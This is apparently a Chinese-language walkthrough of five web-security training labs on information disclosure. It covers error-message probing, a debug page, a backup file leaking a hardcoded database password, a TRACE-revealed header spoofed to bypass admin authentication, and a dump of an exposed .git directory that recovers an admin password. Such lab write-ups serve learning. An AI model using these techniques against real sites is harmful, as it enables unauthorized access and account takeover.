# Information disclosure

[TOC]

## 1. Information disclosure in error messages

`/product?productId='`

直接拿到版本号`Apache Struts 2 2.3.31`。

## 2. Information disclosure on debug page

这个题要拿环境变量`SECRET_KEY`。

找了半天没找到，然后发现了这条注释。

`<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->`

然后进去就能搜到了。

## 3. Source code disclosure via backup files

> 这个实验室通过一个隐藏目录中的**备份文件**泄露了源代码。要解决这个实验室，需要识别并提交数据库密码，该密码是在泄露的**源代码中硬编码**的。

先进入`/robots.txt`查看有没有泄露路径，发现了`/backup`路径。

发现了这个文件`ProductTemplate.java.bak`。

```java
ConnectionBuilder connectionBuilder = ConnectionBuilder.from(
    "org.postgresql.Driver",
    "postgresql",
    "localhost",
    5432,
    "postgres",
    "postgres",
    "nsggpqs1e8os3yddln3nsiryort3xhok"
).withAutoCommit();
```

这个builder里面就暴露了数据库密码`nsggpqs1e8os3yddln3nsiryort3xhok`。

## 4. Authentication bypass via information disclosure

> 需要获得请求头的名称，然后用它来绕过实验室的认证。进入管理界面，删除Carlos的账户。

访问`/admin`的时候，提示`Admin interface only available to local users`。

> HTTP TRACE方法是为诊断目的而设计的，但偶尔会导致信息泄露，如内部认证头的名称

进行请求`TRACE /admin HTTP/1.1`，看到了请求头`X-Custom-IP-Authorization: x.x.x.x`。

直接GET请求`/admin`，添加头`X-Custom-IP-Authorization: 127.0.0.1`。删除的时候也要加。

## 5. Information disclosure in version control history

这个题应该是有版本备份，比如`.git`。

发现可以直接访问`/.git`。

用`GitHack-master`先试试。发现不太行。

换成`Git_Extract-master`。

` python2 git_extract.py https://ac281fcb1fc62c63800b178b009500bb.web-security-academy.net/.git/`

`git clone`下来之后，对比俩版本的`diff`。

`git diff 6d16b03 d5fc953`

```
-ADMIN_PASSWORD=env('ADMIN_PASSWORD')
+ADMIN_PASSWORD=8fv9zwynxku1mej5ltth
```

然后用`administrator:8fv9zwynxku1mej5ltth`登陆进去。

删除账户就好了。